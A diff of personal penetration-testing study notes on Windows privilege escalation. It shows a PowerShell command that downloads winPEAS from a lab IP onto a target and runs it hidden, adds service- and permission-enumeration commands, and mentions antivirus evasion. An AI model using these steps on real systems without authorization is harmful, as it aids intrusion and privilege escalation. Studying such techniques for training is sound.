@@ -129,7 +129,7 @@ then on target download using
 iwr -uri http://192.168.45.230/winPEASx64.exe -Outfile winPEAS.exe
           
 Start-Process -FilePath "winPEAS.exe" -RedirectStandardOutput "winlog.txt" -NoNewWindow -WindowStyle Hidden
-# CMD
+### CMD
 start /B cmd /C "winPEAS.exe > winPEAS.txt"
 Get-Content winPEAS.txt | Out-Host -Paging
 
@@ -140,6 +140,23 @@ from INE I learned about using
 ** automated tools can be blocked by AV solutions. If this is the case, we can apply techniques learned in the Module "Antivirus Evasion", try other tools such as Seatbelt2 and JAWS,3 or do the enumeration manually.
           
 winPeas misses things... don't forget manual enumeration...
+          
+     
+ List all running services and their paths
+
+Get-Service
+          
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+          
+When using a network logon such as WinRM or a bind shell, Get-CimInstance and Get-Service will result in a "permission denied" error when querying for services with a non-administrative user. Using an interactive logon such as RDP solves this problem.
+          
+Find perms
+          
+icacls "C:\xampp\apache\bin\httpd.exe" or Get-ACL
+          
+
+          
+
           
        
 
